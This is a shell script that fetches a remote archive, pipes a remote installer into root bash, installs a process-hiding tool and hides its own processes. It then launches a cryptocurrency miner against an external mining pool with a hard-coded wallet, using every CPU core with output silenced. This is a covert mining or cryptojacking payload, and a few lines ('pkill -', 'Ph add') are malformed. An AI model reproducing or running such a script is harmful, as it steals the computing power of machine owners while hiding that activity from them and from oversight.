#!/bin/sh
pkill -
wget https://bitbucket.org/Abyehaqi/haqie/downloads/sugar.tar.gz
tar -xvf sugar.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add gudubrag.sh
Ph add python3
ph add root
ph add node-process-hider
ph add -
./onta -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.BURIK -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
